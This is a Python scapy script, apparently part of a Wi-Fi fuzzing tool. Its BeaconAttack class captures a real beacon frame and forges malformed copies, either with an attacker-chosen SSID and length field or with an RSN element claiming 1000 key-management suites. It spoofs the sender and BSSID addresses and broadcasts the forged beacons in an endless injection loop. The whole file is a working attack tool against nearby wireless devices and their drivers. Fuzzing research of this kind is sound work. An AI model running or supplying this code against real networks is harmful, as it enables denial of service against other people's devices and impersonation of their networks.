from scapy.all import *
import random
import time
import sys

from utilities import *

OUR_FCS = 1094795585
FIRST_AKM_SUITE_ENCRYPTION = 'ab:cd:ef:02'
AKM_SUITE_COUNT = 1000

"""
The argument isProtected:
	The privacy flag in capabilities is always false, no matter the value of the argument isProtected.
		True = "protected" network (by a password) - Beacon packet include protected flags
		False = open network - Beacon packet not include protected flags
"""
class BeaconAttack:
	def __init__(self, name, length, isProtected, isVerbose, target, source, monitor, injector):
		self.name = name
		self.length = length
		self.isProtected = isProtected
		self.isVerbose = isVerbose
		self.target = target
		self.source = source
		self.monitor = monitor
		self.injector = injector
		self.beacon = None
		
	def __makeNetworkUnprotected(self, pkt): # remove all the tags of protected in the packet
		try:
			layer = pkt.getlayer(Dot11EltMicrosoftWPA)
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			pass
		
		try:
			layer = pkt.getlayer(Dot11EltRSN)
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
		except:
			return pkt
		return pkt

	def __fuzzBeaconRSNLayer(self, pkt):
		pkt = removeEltLayer(pkt, 0)
		pkt = pkt / Dot11Elt(ID = 0, len = self.length, info = self.name)
		
		layer = pkt.getlayer(Dot11EltRSN)
		afterLayer = layer.payload
		layer.underlayer.remove_payload()
		pkt = pkt / afterLayer
		layer.nb_akm_suites = AKM_SUITE_COUNT
		layer.akm_suites = [FIRST_AKM_SUITE_ENCRYPTION]
		layer.remove_payload()
		pkt = pkt / layer
		
		pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = self.source, self.source # destination is already broadcast, no need to change
		pkt.getlayer(Dot11).fcs = OUR_FCS # AAAA in decimal, for easier reading in wireshark
		
		return pkt

	def __fuzzBeaconSSIDLayer(self, pkt, name, length):
		pkt = removeEltLayer(pkt, 0)
		if(not self.isProtected):
			pkt = self.__makeNetworkUnprotected(pkt)
		pkt.getlayer(Dot11Beacon).cap = 0x0100
		#pkt = pkt / fuzz(Dot11Elt(ID = 0)) # fuzz SSIDs
		pkt = pkt / Dot11Elt(ID = 0, len = length, info = name)
		pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = self.source, self.source # destination is already broadcast, no need to change
		pkt.getlayer(Dot11).fcs = OUR_FCS # AAAA in decimal, for easier reading in wireshark
		#del pkt.getlayer(Dot11).fcs # recalculate the frame check sequence
		return pkt

	def beaconAttack(self):
		def stopFilter(pkt):
			if(pkt.haslayer(Dot11Beacon)): 
				print("Sniffed a beacon frame")
				self.beacon = pkt
				return True
			return False
			
		sniff(iface = self.monitor, stop_filter = stopFilter)
		while(self.beacon == None):
			time.sleep(0.5)

		choice = input('Enter 1 to fuzz SSID layer or 2 to fuzz RSN layer: ')
		if choice == '1':
			beacon = self.__fuzzBeaconSSIDLayer(self.beacon, self.name, self.length) 
		elif choice == '2':
			beacon = self.__fuzzBeaconRSNLayer(self.beacon)
		else:
			return
		while 1:
			sendp(beacon, iface = self.injector, verbose = self.isVerbose)
			time.sleep(0.2)
